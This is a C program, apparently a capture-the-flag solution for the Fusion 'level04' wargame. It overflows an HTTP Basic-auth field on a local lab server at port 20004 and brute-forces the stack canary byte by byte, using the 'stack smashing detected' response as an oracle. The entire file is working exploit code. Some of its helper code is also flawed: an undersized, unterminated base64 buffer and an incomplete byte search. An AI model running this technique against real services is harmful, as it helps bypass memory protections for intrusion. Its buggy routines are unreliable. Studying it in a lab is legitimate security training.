#include <sys/select.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <err.h>
#include <errno.h>
#include <string.h>

#define size 8192

char *b64_encode(char *src, size_t s_src);
void build_request(char *password, char *dst);

char *fuzz_src, *fuzz_dst;
size_t fuzz_src_s, fuzz_dst_s, fuzz_len;
const char *request_skel = "GET / HTTP/1.0\r\nAuthorization: Basic %s\r\n\r\n";
const char *usage = "%s password\n";
const char *auth_skel = "pad:%s";
const char *sign = "*** stack smashing detected ***: /opt/fusion/bin/level04 terminated";

void
build_request(char *password, char *dst)
{
	size_t total;
	int err, c;
	char *buf, *buf_p, *b64;

	buf = alloca(size);
	err = errno;
	if (buf == NULL)
		errx(1, "build_request: buf alloca error: %s", strerror(err));
	buf_p = buf;

	c = snprintf(buf, size, auth_skel, password);
	buf_p += c;
	memcpy(buf_p, fuzz_src, fuzz_len);
	//fprintf(stderr, buf);

	total = fuzz_len + strlen(password) + 1;

	b64 = b64_encode(buf, total);
	while (strlen(b64) % 4 != 0)
	{
		strcat(b64, "=");
	}

	snprintf(dst, size, request_skel, b64);

	//fprintf(stderr, "buf_two: %p\n", b64);
	free(b64);
}

char
*b64_encode(char *src, size_t s_src)
{
	// stolen implementation from
	// https://en.wikipedia.org/wiki/Base64
	char table[65] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
	char *dst, *dst_p;
	int i, b, err;

	dst = calloc(sizeof(char), (s_src * 4) / 3);
	err = errno;
	if (dst == NULL)
		errx(1, "b64_encode: dst calloc error: %s", strerror(err));
	dst_p = dst;

	for (i = 0; i < s_src; i += 3)
	{
		b = (src[i] & 0xfc) >> 2;
		*dst++ = table[b];
		b = (src[i] & 0x03) << 4;
		if (i + 1 < s_src)
		{
			b |= (src[i + 1] & 0xf0) >> 4;
			*dst++ = table[b];
			b = (src[i + 1] & 0x0f) << 2;
			if (i + 2 < s_src)
			{
				b |= (src[i + 2] & 0xc0) >> 6;
				*dst++ = table[b];
				b = src[i + 2] & 0x3f;
				*dst++ = table[b];
			} else
			{
				*dst++ = table[b];
				*dst++ = 0x3d; // 0x3d is ascii point of =
			}

		} else
		{
			*dst++ = table[b];
			*dst++ = 0x3d;
			*dst++ = 0x3d;
		}
	}
	return dst_p;
}

__attribute__((constructor))
void
init(void)
{
	int err = 0;

	fuzz_src_s = size;
	fuzz_dst_s = (fuzz_src_s * 4) / 3;

	fuzz_src = calloc(sizeof(char), fuzz_src_s);
	err = errno;
	if (fuzz_src == NULL)
		errx(1, "fuzz_src calloc error: %s\n", strerror(err));
	
	fuzz_dst = calloc(sizeof(char), fuzz_dst_s);
	err = errno;
	if (fuzz_src == NULL)
		errx(1, "fuzz_dst calloc error: %s\n", strerror(err));
}

__attribute__((destructor))
void
unit(void)
{
	free(fuzz_src);
	free(fuzz_dst);
}

int
main(int argc, char **argv)
{
	struct sockaddr_in serv_addr;
	struct timeval tv;

	unsigned char canary[4] = {0};
	char *fuzz_p, *password;
	char buffer[size];
	int index, sockfd, err, result;
	size_t len;

	if (argc < 2)
		errx(1, usage, argv[0]);

	for (index = 0; index < 4; index++)
	{
		for (unsigned char byte = 0; byte < 0xff; byte++)
		{
			bzero(buffer, size);
			canary[index] = byte;
			//fprintf(stderr, "canary: %02x%02x%02x%02x\n", canary[3], canary[2], canary[1], canary[0]);

			sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if (sockfd < 0)
				errx(1, "Error opening socket");

			bzero((char *) &serv_addr, sizeof(serv_addr));
			serv_addr.sin_family = AF_INET;
			serv_addr.sin_addr.s_addr = inet_addr("192.168.1.6");
			serv_addr.sin_port=htons(20004);

			connect(sockfd, &serv_addr, sizeof(serv_addr));
			err = errno;
			if (err != 0)
				errx(1, "Error connecting: %s", strerror(err));
			
			password = argv[1];
			#define overflow 2031
			memset(fuzz_src, 0x41, overflow-4); // 2027
			fuzz_p = fuzz_src + overflow-3;
			fuzz_len = overflow + index+1;
			memcpy(fuzz_p, canary, index+1);
			//fuzz_p[index] = canary[index];
			//memcpy(fuzz_p, canary, index+1);

			build_request(password, fuzz_dst);
			//fwrite(fuzz_src, fuzz_len, 1, stdout);
			len=strlen(fuzz_dst);
			//fwrite(fuzz_src, fuzz_len, 1, stdout);
			send(sockfd, fuzz_dst, len, 0);
			recv(sockfd, buffer, size, MSG_WAITALL); // waitall should be better
			close(sockfd); // 2 = stop both reception and transmission
			//fprintf(stdout, "%s", buffer);
			//sleep for a while :)
			tv.tv_sec = 0;
			tv.tv_usec = 500;
			select(0, NULL, NULL, NULL, &tv);
			result = strncmp(buffer, sign, 67);
			//fprintf(stderr, "[debug] result: %d\n", result);
			if (result > 0)
			{
				fprintf(stderr, "[info] Incrementing Index, found valid canarybyte: %02x\n", canary[index]);
				break;
			} 
		}
	}
	fprintf(stderr, "canary: %02x%02x%02x%02x\n", canary[3], canary[2], canary[1], canary[0]);	
	return 0;
}
